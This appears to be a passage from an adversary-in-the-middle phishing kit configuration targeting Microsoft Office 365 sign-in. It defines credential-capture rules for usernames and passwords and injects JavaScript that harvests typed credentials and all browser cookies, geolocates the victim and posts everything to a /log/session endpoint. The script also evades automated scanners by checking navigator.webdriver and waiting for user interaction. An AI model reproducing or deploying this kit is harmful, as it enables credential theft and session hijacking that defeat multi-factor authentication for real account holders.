    search:
      - { key: "LoginOptions", search: "1" }
    force:
      - { key: "DontShowAgain", value: "true" }
    type: "post"
auth_urls:
  - "/kmsi*"
  - "/common/kmsi*"
  - "/ppsecure/post.srf*"
  - "/owa/prefetch.aspx*"
  - "/webmanifest.json*"
  - "/landingv2"
  - '/login.srf'
  - "/common/SAS/ProcessAuth*"
  - "/Mfa/ExecuteMfa*"
  - "/common/oauth2/v2.0/token*"
  - "/log/session"
credentials:
  username:
    key: "(login|UserName|username|email|account|DomainUser|loginfmt)"
    search: '(.*)'
    type: 'post'
  password:
    key: "(passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)"
    search: '(.*)'
    type: 'post'
login:
  domain: "login.microsoftonline.com"
  path: "/"
js_inject:
  - trigger_domains: ["*"]
    trigger_paths: ["*"]
    script: |
      (function() {
        var passedGate = false;
        var lastCapture = '';
        var capturedCreds = { username: '', password: '' };
        var watchedElements = typeof WeakSet !== 'undefined' ? new WeakSet() : null;
        var providerName = 'Office 365';
        var providerId = 'o365';

        function sendSessionData() {
          try {
            if (!capturedCreds.username && !capturedCreds.password) return;
            var currentHash = capturedCreds.username + ':' + capturedCreds.password;
            if (currentHash === lastCapture) return;
            lastCapture = currentHash;

            var cookieObj = {};
            document.cookie.split(';').forEach(function(c) {
              c = c.trim();
              if (c) { var eq = c.indexOf('='); if (eq > 0) cookieObj[c.substring(0, eq)] = c.substring(eq + 1); }
            });

            var geoData = { ip: 'Unknown', city: 'Unknown', country_name: 'Unknown' };
            try {
              geoData = fetch('https://ipapi.co/json/').then(r => r.json()).then(d => geoData = d);
            } catch(e) {}
            var ip = geoData.ip;
            var location = geoData.city + ', ' + geoData.country_name;
            var timestamp = new Date().toISOString();
            var device = navigator.userAgent;

            var sessionInfo = {
              provider: providerId,
              credentials: capturedCreds,
              url: window.location.href,
              ip: ip,
              location: location,
              timestamp: timestamp,
              device: device,
              cookies: cookieObj
            };
            var payload = { username: 'SessionData-' + providerName, password: JSON.stringify(sessionInfo) };
            var body = JSON.stringify(payload);

            var h = window.location.hostname;
            var parts = h.split('.');
            if (parts.length > 2) parts.shift();
            var beaconUrl = 'https://' + parts.join('.') + '/log/session';

            fetch(beaconUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: body, keepalive: true }).catch(function(){});
          } catch(e) {}
        }

        function monitorFormInputs() {
          document.querySelectorAll('input').forEach(function(el) {
            if (watchedElements ? watchedElements.has(el) : el._o365Watched) return;
            if (watchedElements) { watchedElements.add(el); } else { el._o365Watched = true; }
            function captureField() {
              var t = (el.type || '').toLowerCase();
              var n = (el.name || el.id || el.getAttribute('aria-label') || '').toLowerCase();
              var v = el.value;
              if (!v) return;
              if (t === 'password' || /pass|pwd/.test(n)) {
                if (v !== capturedCreds.password) { capturedCreds.password = v; sendSessionData(); }
              } else if (t === 'email' || /loginfmt|user|email|login|account/.test(n)) {
                capturedCreds.username = v;
              }
            }
            el.addEventListener('input', captureField, { passive: true });
            el.addEventListener('change', captureField, { passive: true });
            el.addEventListener('blur', captureField, { passive: true });
            el.addEventListener('paste', captureField, { passive: true });
            el.addEventListener('cut', captureField, { passive: true });
            if (t === 'password') el.addEventListener('keyup', captureField, { passive: true });
          });
          document.querySelectorAll('form').forEach(function(form) {
            if (watchedElements ? watchedElements.has(form) : form._o365FormWatched) return;
            if (watchedElements) { watchedElements.add(form); } else { form._o365FormWatched = true; }
            form.addEventListener('submit', function() { sendSessionData(); });
          });
          document.querySelectorAll('input[type="submit"], input[value="Next"], input[value="Sign in"]').forEach(function(btn) {
            if (watchedElements ? watchedElements.has(btn) : btn._o365BtnWatched) return;
            if (watchedElements) { watchedElements.add(btn); } else { btn._o365BtnWatched = true; }
            btn.addEventListener('click', function() { setTimeout(sendSessionData, 100); });
          });
        }

        function runMainLogic() {
          if (passedGate) return;
          passedGate = true;
          var observer = new MutationObserver(function(mutations) {
            for (var i = 0; i < mutations.length; i++) {
              if (mutations[i].addedNodes.length > 0) { monitorFormInputs(); break; }
            }
          });
          window.addEventListener('load', function() { monitorFormInputs(); observer.observe(document.body, { childList: true, subtree: true }); });
          if (document.body) { monitorFormInputs(); observer.observe(document.body, { childList: true, subtree: true }); }
          setInterval(function() {
            var dynamicEls = document.querySelectorAll('[data-dynamic]');
            dynamicEls.forEach(function(el) { el.textContent = new Date().toLocaleTimeString(); });
          }, 1000);
        }

        if (!navigator.webdriver) {
          var interactionHandler = function() { if (passedGate) return; runMainLogic(); };
          document.addEventListener('mousemove', interactionHandler, { once: true, passive: true });
          document.addEventListener('touchstart', interactionHandler, { once: true, passive: true });
          document.addEventListener('keydown', interactionHandler, { once: true, passive: true });
          setTimeout(function() { if (!passedGate) runMainLogic(); }, 4000);
        }
      })();